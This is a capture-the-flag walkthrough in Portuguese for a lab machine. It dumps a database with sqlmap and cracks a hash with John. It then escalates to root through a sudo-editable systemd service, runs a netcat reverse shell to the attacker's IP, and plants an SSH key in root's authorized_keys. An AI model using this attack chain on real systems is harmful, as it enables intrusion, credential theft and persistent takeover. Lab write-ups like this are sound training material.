@@ -1,0 +1,66 @@
+Ao ver as informações da sala vemos que tem "sqlmap"
+
+Usamos o sqlmap no diretorio /products/1
+
+sqlmap -u http://10.10.90.72/products/1 --current-db
+
+Temos um database: duckyinc
+
+Agora vamos ver suas tabelas
+
+sqlmap -u http://10.10.90.72/products/1 -D duckyinc --tables
+
+E encontramos a tabela users. Agora vamos usar o comando sqlmap -u http://10.10.90.72/products/1 -D duckyinc --dump
+
+Pegamos a hash do user server-admin na tabela system-user
+
+E usamos o john para dar crack nela john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+Agora logamos com as cred via ssh e temos nossa user flag
+
+sudo -l 
+
+Encontramos no gtfobins um jeito de modificar o arquivo para que podemos virar root
+
+https://gtfobins.github.io/gtfobins/systemctl/#sudo
+
+Editamos o arquivo usando sudoedit e deixamos ele assim "sudoedit /etc/systemd/system/duckyinc.service"
+[Unit]
+Description=Gunicorn instance to serve DuckyInc Webapp
+After=network.target
+
+[Service]
+User=root
+Group=root
+WorkingDirectory=/var/www/duckyinc
+ExecStart=/bin/bash /tmp/glrn.sh
+ExecReload=/bin/kill -s HUP $MAINPID
+ExecStop=/bin/kill -s TERM $MAINPID
+
+[Install]
+WantedBy=multi-user.target
+
+Salvamos o arquivo e vamos para a pasta tmp
+
+Criamos um arquivo.sh com o mesmo nome que usamos no codigo acima "glrn.sh" e dentro desse codigo passamos nossa shell
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc (nosso ip) 4444 >/tmp/f
+
+Salvamos e abrimos a porta com o netcat na nossa maquina
+
+Agora vamos rodar os seguintes codigos
+
+sudo /bin/systemctl daemon-reload 
+sudo /bin/systemctl restart duckyinc.service
+
+Quando rodarmos o restart pegaremos root
+
+Agora para pegarmos uma shell 100%, colocaremos nossa ssh key dentro da pasta root
+
+"echo (ssh-pub-key)" > root/.ssh/authorized_keys
+
+E logamos como root
+
+Vamos para a pasta /var/www/duckyinc/templates/ e editamos o arquivo index.html
+
+Quando editarmos qualquer coisa dele e salvarmos nossa flag3 ira aparecer na pasta /root
